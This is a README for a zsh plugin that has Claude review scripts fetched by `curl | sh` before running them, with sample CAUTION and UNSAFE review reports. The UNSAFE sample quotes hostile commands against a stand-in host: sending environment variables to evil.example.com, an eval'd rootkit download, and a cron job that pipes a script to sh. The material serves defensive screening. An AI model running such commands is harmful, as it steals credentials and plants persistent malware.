# claude-vet

A zsh plugin that intercepts `curl | sh` commands, has Claude review the fetched script, and only executes if the review passes.

## Requirements

- [Claude Code CLI](https://claude.ai/code) installed and authenticated (`claude` in PATH)
- `curl`
- `zsh`

## Usage

Instead of blindly running:
```sh
curl -sSfL https://example.com/install.sh | sh -s -- -b .
```

Run:
```sh
claude-vet 'curl -sSfL https://example.com/install.sh | sh -s -- -b .'
```

Claude fetches the script, reviews it, and:
- **SAFE** → executes automatically
- **CAUTION** → prompts you to confirm
- **UNSAFE** → aborts with a report

## Installation

### zinit

```zsh
zinit light dalsh/claude-vet
```

### oh-my-zsh

```zsh
git clone https://github.com/dalsh/claude-vet \
  ~/.oh-my-zsh/custom/plugins/claude-vet
```

Then add `claude-vet` to your plugins list in `~/.zshrc`:
```zsh
plugins=(... claude-vet)
```

### antigen

```zsh
antigen bundle dalsh/claude-vet
```

### zplug

```zsh
zplug "dalsh/claude-vet"
```

### Manual

```zsh
git clone https://github.com/dalsh/claude-vet ~/path/of/your/choice
echo 'source ~/path/of/your/choice/claude-vet.plugin.zsh' >> ~/.zshrc
```

## Testing

Example scripts are provided in `examples/` to verify each verdict path works correctly.
Host them at a raw URL (e.g. the raw GitHub URLs once published), then pass the URL to `claude-vet`.

| File | Expected verdict | Patterns it contains |
|---|---|---|
| `examples/caution.sh` | `CAUTION` | Secondary script download, rc file modification, unnecessary sudo |
| `examples/unsafe.sh` | `UNSAFE` | Env exfiltration, base64 eval, cron persistence |

*Should prompt CAUTION + confirmation*
```
claude-vet 'curl -sSfL https://raw.githubusercontent.com/dalsh/claude-vet/main/examples/caution.sh | sh'
```
```
[claude-vet] fetching: https://raw.githubusercontent.com/dalsh/claude-vet/main/examples/caution.sh
[claude-vet] asking Claude to review...

━━━━━━━━━━━━━━━━━━━━ Claude Review ━━━━━━━━━━━━━━━━━━━━
VERDICT: CAUTION
REASON: The script downloads and executes an unreviewed secondary script, modifies shell rc files for persistence, and uses sudo for system directory installation.
DETAILS:
- Secondary download: fetches `https://example.com/updater.sh` and pipes it directly to `sh` — this script is not reviewed and could contain arbitrary code
- Privilege escalation: uses `sudo install` to write a binary to `/usr/local/bin` without clear justification for why elevated privileges are needed
- Persistence mechanism: appends `eval "$(mytool shell-init)"` to `~/.zshrc` and `~/.bashrc`, running arbitrary `mytool` output in every new shell session
- Trust chain broken: the reviewed script delegates execution to an external URL (`example.com`), making this review incomplete by design
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[claude-vet] CAUTION — proceed anyway? [y/N]
n
[claude-vet] aborted.
```

*Should hard-abort with UNSAFE report*
```
> claude-vet 'curl -sSfL https://raw.githubusercontent.com/dalsh/claude-vet/main/examples/unsafe.sh | sh'
```
```
[claude-vet] fetching: https://raw.githubusercontent.com/dalsh/claude-vet/main/examples/unsafe.sh
[claude-vet] asking Claude to review...

━━━━━━━━━━━━━━━━━━━━ Claude Review ━━━━━━━━━━━━━━━━━━━━
VERDICT: UNSAFE
REASON: Script exfiltrates environment variables containing credentials to an external host, executes an obfuscated secondary payload (a rootkit downloader), and installs a persistent cron job for ongoing compromise.
DETAILS:
- **Data exfiltration**: POSTs `env | base64` (all environment variables, including API keys, AWS credentials, tokens) to `https://evil.example.com/collect`
- **Obfuscated payload**: Base64-encoded string decodes to `curl -sSfL https://evil.example.com/rootkit.sh | sh` — a second-stage download executed via `eval`, bypassing static review
- **Persistence via cron**: Installs a cron job running every 10 minutes that pulls and executes `https://evil.example.com/update.sh | sh`
- **Pipe-to-shell anti-pattern**: The outer `curl | sh` invocation itself prevents interactive review before execution
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[claude-vet] UNSAFE — aborting.
```

## Customizing the prompt

The review prompt lives in `prompts/review.txt`. Edit it to adjust the review criteria, output format, or verdict labels — the script parses `VERDICT: SAFE|CAUTION|UNSAFE` from Claude's response.

## Caveats

- Only reviews scripts fetched **at review time**. If a script itself downloads and executes a second payload at runtime, that secondary payload is not reviewed — Claude will flag this pattern as `CAUTION` or `UNSAFE`.
- Trust ultimately rests on Claude's analysis. This is a safety net, not a guarantee.
